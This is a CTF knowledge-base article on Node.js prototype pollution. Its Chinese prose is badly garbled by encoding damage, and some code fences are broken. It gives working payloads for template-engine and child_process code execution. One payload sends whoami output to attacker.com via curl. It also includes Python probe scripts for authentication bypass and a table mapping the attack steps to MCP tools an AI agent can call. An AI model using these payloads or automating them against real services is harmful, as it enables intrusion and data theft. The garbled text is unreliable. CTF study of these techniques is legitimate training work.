---
id: 'ctf-website/03-injection/prototype-pollution'
title: 'Prototype Pollution (鍘熷瀷閾炬薄鏌?'
title_en: 'Prototype Pollution'
summary: >
  娣卞叆璁茶В Node.js 鐜涓師鍨嬮摼姹℃煋鐨勫畬鏁存敾鍑婚摼锛屼粠涓嶅畨鍏ㄦ繁鎷疯礉/瀵硅薄鍚堝苟鐨勬薄鏌撴簮澶存帰娴嬶紝鍒?EJS/Pug/Handlebars 妯℃澘寮曟搸 RCE銆佸瓙杩涚▼姹℃煋銆丮organ 鏃ュ織娉ㄥ叆绛夐珮浠峰€?Sink 鍒╃敤锛屾兜鐩?CVE-2025-55182 鍜?CVE-2025-57820 绛夋渶鏂版紡娲炪€?
summary_en: >
  A deep dive into prototype pollution in Node.js, from source detection via unsafe deep copy/object merge, to high-value sink exploitation including EJS/Pug/Handlebars template engine RCE, child_process pollution, and Morgan logger injection. Covers latest CVEs including CVE-2025-55182 and CVE-2025-57820.
board: 'ctf-website'
category: '03-injection'
signals:
  [
    'prototype pollution',
    '鍘熷瀷閾炬薄鏌?,
    '__proto__',
    'constructor.prototype',
    'EJS',
    'Pug',
    'child_process',
    'Node.js'
  ]
mcp_tools: ['http_probe', 'kb_router']
keywords:
  [
    'prototype pollution',
    '鍘熷瀷閾炬薄鏌?,
    '__proto__',
    'EJS RCE',
    'Pug RCE',
    'Node.js瀹夊叏',
    'CVE-2025-55182',
    'devalue'
  ]
difficulty: 'advanced'
tags: ['injection', 'prototype-pollution', 'nodejs', 'rce', 'web-security', 'cve', 'ctf']
language: 'zh-CN'
last_updated: '2026-06-25'
related_articles: []
---

# Prototype Pollution (鍘熷瀷閾炬薄鏌?

鍦?Node.js (JavaScript) 鐜涓紝`Object.prototype` 鏄墍鏈夋櫘閫氬璞＄殑鍩虹被銆傚綋绋嬪簭涓嶅畨鍏ㄥ湴灏嗕笉鍙俊鐨?JSON 閿€煎閫掑綊鍚堝苟鍒扮幇鏈夊璞′腑鏃讹紝鍙兘浼氬鑷?*鍘熷瀷閾炬薄鏌?*銆傝繖鑳戒慨鏀规墍鏈夋柊寤哄璞＄殑榛樿灞炴€э紝浠庤€岀粫杩囬壌鏉冿紝鐢氳嚦閫氳繃姹℃煋鐗瑰畾鐨勬ā鏉垮紩鎿庢垨瀛愯繘绋嬮€夐」杈炬垚 **RCE**銆?

---

## 1. 姹℃煋婧愬ご (Sources) 涓庢娴?

鍘熷瀷閾炬薄鏌撻€氬父婧愪簬涓嶅畨鍏ㄧ殑**娣辨嫹璐?(Deep Copy)**銆?*瀵硅薄鍚堝苟 (Merge)** 鎴?*璺緞璧嬪€?(Path Setter)** 鍑芥暟锛?

```javascript
// 鍏稿瀷鐨勮剢寮?merge 鍑芥暟
function merge(target, source) {
  for (let key in source) {
    if (typeof target[key] === 'object' && typeof source[key] === 'object') {
      merge(target[key], source[key]) // 閫掑綊鍚堝苟
    } else {
      target[key] = source[key]
    }
  }
}
```

### 鎺㈡祴 Payload

鎴戜滑鍙互杈撳叆濡備笅鍙傛暟锛?

- **JSON 鏍煎紡**锛?```json { "__proto__": { "polluted": "yes" } } ```
- **瀵逛簬绂佹浜?`__proto__` 閿悕浣嗘病鏈夐槻鑼?`constructor` 鐨勮繃婊ゅ櫒**锛?```json { "constructor": { "prototype": { "polluted": "yes" } } } ```
- **楠岃瘉鏂规硶**锛?鍦ㄦ帶鍒跺彴涓柊寤轰竴涓櫘閫氱┖瀵硅薄 `const obj = {};`銆傝嫢 `obj.polluted === "yes"`锛屽垯璇佹槑姹℃煋鎴愬姛銆?
---

## 2. 楂樹环鍊煎埄鐢ㄩ摼 (Exploit Sinks)

鍘熷瀷閾炬薄鏌撴垚鍔熷悗锛岄渶瑕佹壘鍒拌绉颁负 **Sink** 鐨勮Е鍙戠偣鎵嶈兘灏嗗叾杞寲涓虹湡姝ｇ殑鍗卞銆?

### A. EJS 妯℃澘寮曟搸娉ㄥ叆 (RCE)

EJS 鍦ㄦ覆鏌撴椂锛屼細璇诲彇閰嶇疆瀵硅薄涓殑 `outputFunctionName` 灞炴€э紝濡傛灉涓嶄负 undefined锛屽垯浣跨敤 `eval` 鍔ㄦ€佺敓鎴愭覆鏌撳嚱鏁帮細

- **婕忔礊 Sink 鍒嗘瀽**锛?鍦?`ejs.js` 涓湁绫讳技浠ｇ爜锛歚var fn = new Function(opts.localsName, ... ... + opts.outputFunctionName + ...)`銆?- **Payload 鏋勯€?*锛?閫氳繃鍘熷瀷閾炬薄鏌撹缃?`outputFunctionName` 涓烘伓鎰?JS 璇彞锛?```json { "__proto__": { "outputFunctionName": "x; const exec = require('child_process').execSync; exec('curl http://attacker.com/' + exec('whoami')); //" } } ``` 褰撳簲鐢ㄩ殢鍚庤皟鐢?`ejs.render(template, data)` 鏃讹紝鎭舵剰浠ｇ爜鍦?eval 涓墽琛岋紝瀹炵幇鍛戒护鎵ц銆?
### B. Pug 妯℃澘寮曟搸娉ㄥ叆 (RCE)

Pug 涔熸湁绫讳技鐨勬ā鏉块€夐」婕忔礊銆侾ug 缂栬瘧鍑芥暟鏃讹紝濡傛灉閫夐」涓寘鍚?`self`锛屽畠浼氶€氳繃鍔犺浇鏌愪簺鐗规畩鑺傜偣鍔ㄦ€佹瀯寤烘墽琛屼唬鐮併€?

- **Payload 鏋勯€?*锛?```json { "__proto__": { "self": true, "line": "console.log(global.process.mainModule.require('child_process').execSync('whoami').toString())" } } ```

### C. 瀛愯繘绋?`child_process.spawn` 姹℃煋 (RCE)

褰撳悗绔皟鐢?`child_process.spawn()` 鎴?`fork()`锛屼絾鏈寚瀹?`shell`銆乣env` 绛夊睘鎬ф椂锛屽畠浼氫粠 `Object.prototype` 涓幓鑾峰彇杩欎簺閫夐」銆?

- **姹℃煋 `shell` 涓?`argv`**锛?濡傛灉鎴戜滑灏?`shell` 姹℃煋涓烘伓鎰忕殑鍙墽琛屾枃浠惰矾寰勶紝鎴栬€呭悜鍏舵敞鍏ラ澶栫殑鐜鍙橀噺锛屽嵆鍙湪鍚庣娲剧敓瀛愯繘绋嬬殑鐬棿鍔寔鎺у埗娴侊細 ```json { "__proto__": { "shell": "node", "argv0": "-e", "NODE_OPTIONS": "--require=/tmp/evil.js" } } ```

---

## 3. 闃茶寖涓庣幆澧冧慨澶?(Clean-up)

鍦?CTF 婕忔礊楠岃瘉瀹屾瘯鍚庯紝濡傛灉鐜鏄暱鐢熷懡鍛ㄦ湡鐨勫簲鐢紙濡傚父椹荤殑 Node.js Web 鏈嶅姟锛夛紝鍘熷瀷閾炬薄鏌撲慨鏀圭殑鏄繍琛屾椂鐨勫叏灞€鍩虹被銆傚鏋滀笉鍙婃椂娓呯悊锛屽彲鑳戒細瀵艰嚧鍚庣宕╂簝锛屾垨鑰呰鍏朵粬闃熶紞鐩存帴鍒╃敤浣犵殑姹℃煋鎴愭灉銆?

- **鎵嬪姩澶嶄綅**锛?姹℃煋鎴愬姛鍚庯紝浣跨敤 Python 鎴?Curl 鍙戦€佸浣?Payload 鎿﹂櫎灞炴€э細 ```json { "__proto__": { "outputFunctionName": null, "polluted": null } } ```

---

## 4. Server-Side PP via Query Parser

```python
# qs (Node.js query string 搴? 鍏佽鍒涘缓宓屽瀵硅薄:
# GET /api/users?__proto__[isAdmin]=true
# 琚?qs 瑙ｆ瀽涓? {"__proto__": {"isAdmin": "true"}}

# 濡傛灉杩欎釜瀵硅薄闅忓悗琚?Object.assign 鎴?merge 鍒板叾浠栧璞?
# 鈫?Object.prototype.isAdmin = "true"
# 鈫?鎵€鏈夋柊瀵硅薄缁ф壙 isAdmin = true
# 鈫?閴存潈缁曡繃

def test_qs_pp(target: str):
    """娴嬭瘯 query string 鈫?prototype pollution"""
    probes = [
        "__proto__[polluted]=yes",
        "__proto__.polluted=yes",
        "constructor[prototype][polluted]=yes",
        "__proto__[isAdmin]=true",
        "__proto__[role]=admin",
    ]
    for probe in probes:
        r = requests.get(f"{target}?{probe}")
        r2 = requests.get(f"{target}/api/me")
        if "admin" in r2.text or r2.status_code != 401:
            print(f"[!] Potential PP via QS: {probe}")
```

---

## 5. 鏇村 Node.js Sinks

### Handlebars RCE

```json
{ "__proto__": { "precompileOptions": { "knownHelpersOnly": false } } }
```

### Morgan (Logger) 娉ㄥ叆

```json
{ "__proto__": { "format": "':  require('child_process').execSync('id') //" } }
```

### Node-Serialize 鈫?RCE

```json
{
  "__proto__": {
    "type": "function",
    "body": "return require('child_process').execSync('id').toString()"
  }
}
```

### MSR (Mini-Static-Resource) 鈫?RCE

```json
{ "__proto__": { "root": "/", "path": "/flag" } }
```

---

## 6. Client-Side PP (DOM 姹℃煋)

```javascript
// 褰撳鎴风 JS 鍋?Object.assign 鎴?spread 鏃?
// URL: https://target.com/#__proto__[isAdmin]=true
// JS 瑙ｆ瀽 hash 鎴?query params 鍚?merge 鈫?姹℃煋 Object.prototype

// 妫€娴? 鍦?Console 鎵ц
console.log({}.isAdmin) // 濡傛灉杩斿洖 true 鈫?宸茶姹℃煋
```

---

## 7. PP 鎺㈡祴鑴氭湰

```python
# 鑷姩妫€娴?prototype pollution 鍏ュ彛
import requests

PP_PROBES = [
    # JSON
    ('json', {"__proto__": {"polluted": "yes"}}),
    ('json', {"constructor": {"prototype": {"polluted": "yes"}}}),
    ('json', {"__proto__": {"isAdmin": True}}),
    # Query string
    ('qs', "__proto__[polluted]=yes"),
    ('qs', "constructor[prototype][polluted]=yes"),
    # Form data
    ('form', {"__proto__[polluted]": "yes"}),
    ('form', {"constructor[prototype][polluted]": "yes"}),
]

def probe_pp(target_url: str, endpoints: list[str]):
    for ep in endpoints:
        for fmt, payload in PP_PROBES:
            if fmt == 'json':
                r = requests.post(target_url + ep, json=payload)
            elif fmt == 'qs':
                r = requests.get(target_url + ep + '?' + payload)
            else:
                r = requests.post(target_url + ep, data=payload)
            # 鐪嬫槸鍚︽湁寮傚父鍝嶅簲
            if r.status_code not in (400, 401, 403, 404):
                print(f"  [{fmt}] {ep}: {r.status_code}")
```

---

## 8. 鏀诲嚮閾?

````
PP 鈫?EJS outputFunctionName 鈫?RCE
PP 鈫?Pug self+line 鈫?RCE
PP 鈫?child_process.spawn shell 鈫?RCE
PP 鈫?Morgan format 鈫?浠绘剰浠ｇ爜鎵ц
PP 鈫?Handlebars knownHelpers 鈫?妯℃澘娉ㄥ叆 鈫?RCE
PP via QS 鈫?Object.assign 鈫?isAdmin=true 鈫?閴存潈缁曡繃
Client-Side PP 鈫?__proto__.isAdmin 鈫?鍓嶇璺敱缁曡繃
PP 鈫?bypass rate limit 鈫?淇敼 limit 榛樿鍊?鈫?鏃犻檺璇锋眰

## 9. Advanced PP (2024-2025)

### Constructor.prototype Bypass

```json
// 褰?__proto__ 琚?WAF 杩囨护:
 {"constructor": {"prototype": {"isAdmin": true}}} // Object.constructor.prototype.isAdmin = true 鈫?鎵€鏈夊璞＄户鎵?
// 閾? constructor.prototype.toString = null
 // 鈫?寮哄埗閿欒 鈫?catch 鍧?eval config.debug.code
````

### React RSC Flight Protocol RCE (CVE-2025-55182)

```python
# React Server Components Flight protocol 鍙嶅簭鍒楀寲
# 娉ㄥ叆 __proto__ via Chunk 鈫?promise resolution hijack
# 鈫?require('child_process') 鈫?RCE

# PP payload for RSC stream:
RSC_PP_PAYLOAD = {
 "__proto__": { "then": "require('child_process').execSync('id')" } }
```

### Class Pollution (devalue CVE-2025-57820)

```javascript
// 姹℃煋鐗瑰畾 class prototype 鈫?鑰岄潪鍏ㄥ眬 Object
 // devalue library 鈫?閫掑綊娣辨嫹璐濇椂 constructor.prototype 琚噸鍐?
{"constructor": {"prototype": {"isAdmin": true}}}
 // 鈫?User 绫荤殑 prototype 琚薄鏌?鈫?鎵€鏈?User 瀹炰緥 isAdmin=true
```

### Post-Extraction PP

```python
# NODE_OPTIONS + shell 姹℃煋 鈫?P澶CE锛堝嵆浣垮彧鑳芥薄鏌撳鎴风瀵硅薄锛?

# PP payload:
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /tmp/evil.js"}}
# 鈫?child_process.spawn 缁ф壙 shell 鈫?node 鈫?璇?NODE_OPTIONS
# 鈫?require /tmp/evil.js 鈫?evil.js 鎵ц 鈫?RCE
```

```

## MCP 宸ュ叿鏄犲皠

AI Agent 鍙皟鐢ㄤ互涓?MCP 宸ュ叿鑷姩瀹屾垚鎴栧姞閫熶笂杩版敾鍑绘楠わ細

| 鏀诲嚮姝ラ | MCP 宸ュ叿 | 璇存槑 |
|---------|---------|------|
| HTTP 鎺㈡祴 | `http_probe` | 鍙戦€?prototype pollution payload |
| 鎸変俊鍙锋煡鎶€鏈?| `kb_router` | 鎼滅储 prototype pollution 鐩稿叧鎶€鏈枃浠?|

## 璇佹嵁涓庨獙璇侀棴鐜?

- 淇濆瓨 baseline 涓庡崟鍙橀噺 probe 鐨勫畬鏁磋姹傘€佸搷搴旂姸鎬併€佸叧閿搷搴斿ご鍜屾鏂囨憳瑕併€?- 灏嗏€滃搷搴斿樊寮傗€濅笌鏈嶅姟绔壇浣滅敤鍒嗗紑璁板綍锛涘彧鏈夋潈闄愩€佺姸鎬併€佹暟鎹垨 Flag 鍙噸澶嶅彉鍖栨墠绠楃‘璁ゃ€?- 浠庡叏鏂?session/閲嶇疆鐘舵€佹渶灏忓寲閲嶆斁锛岃褰曚緷璧栥€佸苟鍙戝弬鏁般€佹椂闂寸獥鍙ｅ強澶辫触鏍锋湰銆?- 杈撳嚭缁熶竴鏀惧叆 `exports/ctf-website/<case>/`锛屽嚟鎹彧鐢?`REDACTED` 鍗犱綅锛岃嚜鍔ㄦ绱?`flag{}`銆乣CTF{}`銆乣DASCTF{}`銆?```
